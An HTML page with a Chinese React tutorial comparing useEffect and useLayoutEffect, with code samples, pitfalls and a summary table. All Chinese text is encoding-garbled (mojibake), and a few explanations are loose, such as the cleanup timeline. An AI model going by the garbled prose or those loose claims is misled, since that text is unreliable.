<h3 data-id="heading-6">ğŸŸ  useLayoutEffect æ‰§è¡Œæ—¶é—´çº¿</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Component</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. useLayoutEffect æ‰§è¡Œï¼ˆåŒæ­¥ï¼‰'</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. useLayoutEffect æ¸…ç†å‡½æ•°'</span>);
  }, []);

  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'0. ç»„ä»¶æ¸²æŸ“'</span>);
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Hello<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}

<span class="hljs-comment">// æ‰§è¡Œé¡ºåºï¼š</span>
<span class="hljs-comment">// 0. ç»„ä»¶æ¸²æŸ“</span>
<span class="hljs-comment">// 1. useLayoutEffect æ‰§è¡Œï¼ˆåŒæ­¥ï¼Œé˜»å¡æµè§ˆå™¨ç»˜åˆ¶ï¼‰</span>
<span class="hljs-comment">// æµè§ˆå™¨ç»˜åˆ¶å±å¹•</span>
<span class="hljs-comment">// 2. useLayoutEffect æ¸…ç†å‡½æ•°</span>
</code></pre>
<hr/>
<h3 data-id="heading-7">ğŸ’¡ å¸¸ç”¨åœºæ™¯ &amp; ä»£ç ç¤ºä¾‹</h3>
<h4 data-id="heading-8">åœºæ™¯1ï¸âƒ£ï¼šæ•°æ®è¯·æ±‚ï¼ˆuseEffectï¼‰âœ… æ¨è</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params">{ userId }</span>) {
  <span class="hljs-keyword">const</span> [user, setUser] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);
  <span class="hljs-keyword">const</span> [loading, setLoading] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">true</span>);
    
    <span class="hljs-comment">// å¼‚æ­¥è·å–æ•°æ®</span>
    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/users/<span class="hljs-subst">${userId}</span>`</span>)
      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())
      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> {
        <span class="hljs-title function_">setUser</span>(data);
        <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>);
      })
      .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åŠ è½½å¤±è´¥:'</span>, err);
        <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>);
      });
  }, [userId]);  <span class="hljs-comment">// userId å˜åŒ–æ—¶é‡æ–°è·å–</span>

  <span class="hljs-keyword">if</span> (loading) <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>åŠ è½½ä¸­...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>{user?.name}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆç”¨ useEffectï¼Ÿ</strong></p>
<ul>
<li>æ•°æ®è·å–æ˜¯å¼‚æ­¥æ“ä½œï¼Œä¸éœ€è¦åŒæ­¥é˜»å¡</li>
<li>ç”¨æˆ·çœ‹åˆ°åŠ è½½çŠ¶æ€å¾ˆæ­£å¸¸</li>
</ul>
<hr/>
<h4 data-id="heading-9">åœºæ™¯2ï¸âƒ£ï¼šäº‹ä»¶ç›‘å¬ï¼ˆuseEffectï¼‰âœ… æ¨è</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">WindowResize</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [width, setWidth] = <span class="hljs-title function_">useState</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>);

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleResize</span>(<span class="hljs-params"/>) {
      <span class="hljs-title function_">setWidth</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>);
    }

    <span class="hljs-comment">// æ·»åŠ ç›‘å¬</span>
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, handleResize);

    <span class="hljs-comment">// æ¸…ç†ï¼šç§»é™¤ç›‘å¬</span>
    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'resize'</span>, handleResize);
    };
  }, []);  <span class="hljs-comment">// åªåœ¨æŒ‚è½½æ—¶è¿è¡Œ</span>

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>çª—å£å®½åº¦: {width}px<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆç”¨ useEffectï¼Ÿ</strong></p>
<ul>
<li>äº‹ä»¶ç›‘å¬æ˜¯å¼‚æ­¥çš„ï¼Œä¸éœ€è¦åŒæ­¥æ‰§è¡Œ</li>
<li>å¿…é¡»æ¸…ç†äº‹ä»¶ç›‘å¬å™¨ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼</li>
</ul>
<hr/>
<h4 data-id="heading-10">åœºæ™¯3ï¸âƒ£ï¼šDOM æµ‹é‡ï¼ˆuseLayoutEffectï¼‰âœ… æ­£ç¡®</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MeasureElement</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> ref = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);
  <span class="hljs-keyword">const</span> [height, setHeight] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

  <span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// å¿…é¡»ç”¨ useLayoutEffectï¼Œå¦åˆ™ä¼šé—ªçƒ</span>
    <span class="hljs-comment">// 1. æµ‹é‡ DOM å°ºå¯¸</span>
    <span class="hljs-keyword">const</span> rect = ref.<span class="hljs-property">current</span>.<span class="hljs-title function_">getBoundingClientRect</span>();
    
    <span class="hljs-comment">// 2. åŸºäºå°ºå¯¸è®¡ç®—å¸ƒå±€</span>
    <span class="hljs-keyword">const</span> newHeight = rect.<span class="hljs-property">width</span> &gt; <span class="hljs-number">500</span> ? <span class="hljs-number">300</span> : <span class="hljs-number">150</span>;
    
    <span class="hljs-comment">// 3. ç«‹å³æ›´æ–°ï¼ˆåœ¨æµè§ˆå™¨ç»˜åˆ¶å‰ï¼‰</span>
    <span class="hljs-title function_">setHeight</span>(newHeight);
  }, []);  <span class="hljs-comment">// åªåœ¨æŒ‚è½½æ—¶è¿è¡Œ</span>

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{ref}</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">height:</span> `${<span class="hljs-attr">height</span>}<span class="hljs-attr">px</span>` }}&gt;</span>
      å“åº”å¼é«˜åº¦
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆç”¨ useLayoutEffectï¼Ÿ</strong></p>
<ul>
<li>éœ€è¦åœ¨æµè§ˆå™¨ç»˜åˆ¶å‰å®Œæˆ DOM æµ‹é‡å’Œå¸ƒå±€è®¡ç®—</li>
<li>å¦‚æœç”¨ useEffectï¼Œç”¨æˆ·ä¼šçœ‹åˆ°é«˜åº¦ä» 0 é—ªåˆ° 300ï¼ˆé—ªçƒï¼ï¼‰</li>
</ul>
<hr/>
<h4 data-id="heading-11">åœºæ™¯4ï¸âƒ£ï¼šè¡¨å•ç„¦ç‚¹è®¾ç½®ï¼ˆuseLayoutEffectï¼‰âœ… æ­£ç¡®</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">AutoFocusForm</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> inputRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// å¿…é¡»ç”¨ useLayoutEffectï¼Œå¦åˆ™è¡¨å•æ‰“å¼€æ—¶çœ‹ä¸åˆ°å…‰æ ‡åœ¨å“ª</span>
    inputRef.<span class="hljs-property">current</span>?.<span class="hljs-title function_">focus</span>();
  }, []);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{inputRef}</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"è‡ªåŠ¨èšç„¦"</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>æäº¤<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
  );
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆç”¨ useLayoutEffectï¼Ÿ</strong></p>
<ul>
<li>å¦‚æœç”¨ useEffectï¼Œç”¨æˆ·ä¼šçœ‹åˆ°è¾“å…¥æ¡†å‡ºç°ï¼Œç„¶åå…‰æ ‡æ‰èšç„¦ï¼ˆè§†è§‰å»¶è¿Ÿï¼‰</li>
<li>useLayoutEffect ä¿è¯å…‰æ ‡åœ¨æµè§ˆå™¨ç»˜åˆ¶å‰å·²ç»èšç„¦</li>
</ul>
<hr/>
<h4 data-id="heading-12">åœºæ™¯5ï¸âƒ£ï¼šåŠ¨ç”»åˆå§‹åŒ–ï¼ˆuseLayoutEffectï¼‰âœ… æ­£ç¡®</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">AnimatedBox</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> boxRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// è®¾ç½®åˆå§‹çŠ¶æ€ï¼ˆéšè—ï¼‰</span>
    gsap.<span class="hljs-title function_">set</span>(boxRef.<span class="hljs-property">current</span>, { <span class="hljs-attr">opacity</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">x</span>: -<span class="hljs-number">50</span> });
    
    <span class="hljs-comment">// ç„¶åæ‰§è¡ŒåŠ¨ç”»</span>
    gsap.<span class="hljs-title function_">to</span>(boxRef.<span class="hljs-property">current</span>, { 
      <span class="hljs-attr">opacity</span>: <span class="hljs-number">1</span>, 
      <span class="hljs-attr">x</span>: <span class="hljs-number">0</span>, 
      <span class="hljs-attr">duration</span>: <span class="hljs-number">0.5</span> 
    });
  }, []);

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{boxRef}</span>&gt;</span>åŠ¨ç”»ç›’å­<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆç”¨ useLayoutEffectï¼Ÿ</strong></p>
<ul>
<li>é¿å…ç”¨æˆ·çœ‹åˆ°åˆå§‹æœªå˜æ¢çš„çŠ¶æ€ï¼Œç„¶åæ‰åŠ¨ç”»</li>
<li>useLayoutEffect ä¿è¯åœ¨æµè§ˆå™¨ç»˜åˆ¶å‰å®Œæˆåˆå§‹è®¾ç½®</li>
</ul>
<hr/>
<h4 data-id="heading-13">åœºæ™¯6ï¸âƒ£ï¼šä¸»é¢˜åˆ‡æ¢ï¼ˆuseLayoutEffectï¼‰âš ï¸ ç‰¹æ®Š</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">ThemeProvider</span>(<span class="hljs-params">{ theme }</span>) {
  <span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// ç«‹å³åº”ç”¨ä¸»é¢˜ï¼Œé¿å…é—ªçƒ</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">style</span>.<span class="hljs-property">colorScheme</span> = theme;
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">className</span> = <span class="hljs-string">`theme-<span class="hljs-subst">${theme}</span>`</span>;
  }, [theme]);

  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>å†…å®¹<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆç”¨ useLayoutEffectï¼Ÿ</strong></p>
<ul>
<li>é˜²æ­¢ä¸»é¢˜åˆ‡æ¢æ—¶çš„é—ªçƒï¼ˆæ·±è‰²â†’æµ…è‰² çš„ç™½å±é—ªçƒï¼‰</li>
</ul>
<hr/>
<h3 data-id="heading-14">ğŸ“‹ ä¾èµ–æ•°ç»„è¯¦è§£</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1ï¸âƒ£ æ¯æ¬¡æ¸²æŸ“éƒ½æ‰§è¡Œï¼ˆæ²¡æœ‰ä¾èµ–æ•°ç»„ï¼‰</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ¯æ¬¡éƒ½è¿è¡Œ'</span>);
});

<span class="hljs-comment">// 2ï¸âƒ£ åªåœ¨æŒ‚è½½æ—¶æ‰§è¡Œï¼ˆç©ºä¾èµ–æ•°ç»„ï¼‰</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'åªåœ¨æŒ‚è½½æ—¶æ‰§è¡Œ'</span>);
}, []);

<span class="hljs-comment">// 3ï¸âƒ£ ä¾èµ–å€¼å˜åŒ–æ—¶æ‰§è¡Œ</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'userId å˜åŒ–æ—¶æ‰§è¡Œ'</span>);
}, [userId]);

<span class="hljs-comment">// 4ï¸âƒ£ å¤šä¸ªä¾èµ–</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'userId æˆ– pageNum å˜åŒ–æ—¶æ‰§è¡Œ'</span>);
}, [userId, pageNum]);

<span class="hljs-comment">// 5ï¸âƒ£ ä¾èµ–æ˜¯å¯¹è±¡æ—¶çš„å‘</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// âŒ æ¯æ¬¡éƒ½ä¼šæ‰§è¡Œï¼Œå› ä¸º {} æ¯æ¬¡éƒ½æ˜¯æ–°çš„</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å¯èƒ½æ— é™å¾ªç¯'</span>);
}, [{}]);

<span class="hljs-comment">// âœ… æ­£ç¡®åšæ³•ï¼šä½¿ç”¨ useMemo</span>
<span class="hljs-keyword">const</span> config = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> ({}), []);
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'config ç¨³å®šï¼Œä¸ä¼šæ— é™å¾ªç¯'</span>);
}, [config]);
</code></pre>
<hr/>
<h3 data-id="heading-15">âš ï¸ å¸¸è§é™·é˜±</h3>
<h4 data-id="heading-16">é™·é˜±1ï¸âƒ£ï¼šuseLayoutEffect å¯¼è‡´å¡é¡¿</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// âŒ ä¸å¥½ï¼šuseLayoutEffect ä¸­åšå¤æ‚è®¡ç®—ä¼šé˜»å¡ç»˜åˆ¶</span>
<span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// è¿™ä¼šå†»ç»“æµè§ˆå™¨ï¼</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000000</span>; i++) {
    <span class="hljs-title function_">complexCalculation</span>();
  }
}, []);

<span class="hljs-comment">// âœ… å¥½ï¼šå¤æ‚è®¡ç®—æ”¾åˆ° useEffect</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000000</span>; i++) {
    <span class="hljs-title function_">complexCalculation</span>();
  }
}, []);
</code></pre>
<hr/>
<h4 data-id="heading-17">é™·é˜±2ï¸âƒ£ï¼šuseLayoutEffect åœ¨æœåŠ¡ç«¯æ¸²æŸ“ä¸­æŠ¥é”™</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// âŒ é”™ï¼šSSR æ—¶ä¼šæŠ¥è­¦å‘Š</span>
<span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// SSR ä¸­ä¸èƒ½æ‰§è¡Œ</span>
}, []);

<span class="hljs-comment">// âœ… å¥½ï¼šæ£€æµ‹ç¯å¢ƒ</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> !== <span class="hljs-string">'undefined'</span>) {
    <span class="hljs-comment">// å®¢æˆ·ç«¯ä»£ç </span>
  }
}, []);

<span class="hljs-comment">// æˆ–è€…æ¡ä»¶æ€§ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> useIsomorphicLayoutEffect = 
  <span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span> !== <span class="hljs-string">'undefined'</span> ? useLayoutEffect : useEffect;

<span class="hljs-title function_">useIsomorphicLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// è‡ªåŠ¨é€‚é… SSR</span>
}, []);
</code></pre>
<hr/>
<h4 data-id="heading-18">é™·é˜±3ï¸âƒ£ï¼šå¿˜è®°æ¸…ç†å‰¯ä½œç”¨</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// âŒ åï¼šå†…å­˜æ³„æ¼</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ¯ç§’æ‰§è¡Œ'</span>);
  }, <span class="hljs-number">1000</span>);
  <span class="hljs-comment">// æ²¡æœ‰æ¸…ç†ï¼</span>
}, []);

<span class="hljs-comment">// âœ… å¥½ï¼šè¿”å›æ¸…ç†å‡½æ•°</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> timer = <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ¯ç§’æ‰§è¡Œ'</span>);
  }, <span class="hljs-number">1000</span>);
  
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">clearInterval</span>(timer);  <span class="hljs-comment">// æ¸…ç†å®šæ—¶å™¨</span>
}, []);
</code></pre>
<hr/>
<h4 data-id="heading-19">é™·é˜±4ï¸âƒ£ï¼šæ— é™å¾ªç¯</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// âŒ åï¼šæ— é™å¾ªç¯</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">setCount</span>(count + <span class="hljs-number">1</span>);  <span class="hljs-comment">// æ¯æ¬¡éƒ½ä¿®æ”¹ count</span>
}, [count]);  <span class="hljs-comment">// å¯¼è‡´é‡æ–°æ¸²æŸ“ï¼Œåˆè§¦å‘ effect</span>

<span class="hljs-comment">// âœ… å¥½ï¼šä¸æŠŠæ›´æ–°çš„å€¼æ”¾åœ¨ä¾èµ–ä¸­</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c + <span class="hljs-number">1</span>);
}, []);  <span class="hljs-comment">// ç©ºä¾èµ–ï¼Œåªæ‰§è¡Œä¸€æ¬¡</span>
</code></pre>
<hr/>
<h3 data-id="heading-20">ğŸš€ é€‰æ‹©æµç¨‹å›¾</h3>
<pre><code class="hljs language-markdown" lang="markdown">éœ€è¦æ‰§è¡Œå‰¯ä½œç”¨ï¼Ÿ
<span class="hljs-code">    â†“
æ˜¯å¼‚æ­¥æ“ä½œï¼ˆæ•°æ®è·å–ã€å®šæ—¶å™¨ï¼‰?
    â”œâ”€ æ˜¯ â†’ useEffect âœ…
    â””â”€ å¦ â†“
    
éœ€è¦åœ¨æµè§ˆå™¨ç»˜åˆ¶å‰åŒæ­¥æ‰§è¡Œï¼Ÿ
    â”œâ”€ æ˜¯ â†’ useLayoutEffect âœ…
    â”‚   ä¾‹ï¼šDOM æµ‹é‡ã€ç„¦ç‚¹ã€åŠ¨ç”»ã€ä¸»é¢˜
    â””â”€ å¦ â†’ useEffect âœ…ï¼ˆé»˜è®¤é€‰æ‹©ï¼‰
</span></code></pre>
<hr/>
<h3 data-id="heading-21">ğŸ“Š æ€§èƒ½å¯¹æ¯”</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æµ‹è¯•æ€§èƒ½å½±å“</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">PerformanceTest</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

  <span class="hljs-comment">// useEffect ä¸ä¼šé˜»å¡æ¸²æŸ“</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// å³ä½¿è¿™é‡Œåšå¤æ‚è®¡ç®—ï¼Œé¡µé¢ä¹Ÿèƒ½å¿«é€Ÿå“åº”</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000000</span>; i++) {}
  }, [count]);

  <span class="hljs-comment">// useLayoutEffect ä¼šé˜»å¡æ¸²æŸ“</span>
  <span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// è¿™ä¸ªè®¡ç®—ä¼šè®©ç‚¹å‡»æŒ‰é’®æ—¶å‡ºç°æ˜æ˜¾å»¶è¿Ÿ</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000000</span>; i++) {}
  }, [count]);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt;
      ç‚¹å‡»ï¼š{count}
    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// ç»“è®ºï¼š</span>
<span class="hljs-comment">// useEffect æŒ‰é’®å“åº”è¿…é€Ÿ</span>
<span class="hljs-comment">// useLayoutEffect ç‚¹å‡»æ—¶ä¼šå¡é¡¿</span>
</code></pre>
<hr/>
<h3 data-id="heading-22">âœ… å¿«é€Ÿå‚è€ƒ</h3>
<h4 data-id="heading-23">99% æƒ…å†µç”¨ useEffect</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ•°æ®è·å–</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> { <span class="hljs-title function_">fetchData</span>(); }, []);

<span class="hljs-comment">// äº‹ä»¶ç›‘å¬</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> { 
  <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, handler);
  <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'resize'</span>, handler);
}, []);

<span class="hljs-comment">// å‰¯ä½œç”¨é€šç”¨åœºæ™¯</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> { <span class="hljs-title function_">doSomething</span>(); }, [dep]);
</code></pre>
<h4 data-id="heading-24">ç‰¹æ®Šåœºæ™¯ç”¨ useLayoutEffect</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// DOM æµ‹é‡</span>
<span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> { 
  <span class="hljs-keyword">const</span> rect = ref.<span class="hljs-property">current</span>.<span class="hljs-title function_">getBoundingClientRect</span>();
  <span class="hljs-title function_">setHeight</span>(rect.<span class="hljs-property">height</span>);
}, []);

<span class="hljs-comment">// ç„¦ç‚¹è®¾ç½®</span>
<span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> { 
  inputRef.<span class="hljs-property">current</span>?.<span class="hljs-title function_">focus</span>();
}, []);

<span class="hljs-comment">// åŠ¨ç”»åˆå§‹åŒ–</span>
<span class="hljs-title function_">useLayoutEffect</span>(<span class="hljs-function">() =&gt;</span> { 
  gsap.<span class="hljs-title function_">set</span>(ref.<span class="hljs-property">current</span>, initialState);
  <span class="hljs-title function_">startAnimation</span>();
}, []);
</code></pre>
<hr/>
<h3 data-id="heading-25">ğŸ“ æ€»ç»“</h3>



































<table><thead><tr><th>ç»´åº¦</th><th>useEffect</th><th>useLayoutEffect</th></tr></thead><tbody><tr><td><strong>ä½•æ—¶ç”¨</strong></td><td>99% çš„æƒ…å†µ</td><td>éœ€è¦åŒæ­¥ DOM æ“ä½œ</td></tr><tr><td><strong>æ‰§è¡Œæ—¶æœº</strong></td><td>æµè§ˆå™¨ç»˜åˆ¶å</td><td>æµè§ˆå™¨ç»˜åˆ¶å‰</td></tr><tr><td><strong>æ˜¯å¦é˜»å¡</strong></td><td>ä¸é˜»å¡</td><td>ä¼šé˜»å¡</td></tr><tr><td><strong>æ€§èƒ½</strong></td><td>ä¼˜ç§€</td><td>å¯èƒ½å¡é¡¿</td></tr><tr><td><strong>ä¾‹å­</strong></td><td>æ•°æ®è¯·æ±‚ã€äº‹ä»¶ç›‘å¬</td><td>DOM æµ‹é‡ã€ç„¦ç‚¹ã€åŠ¨ç”»</td></tr></tbody></table>
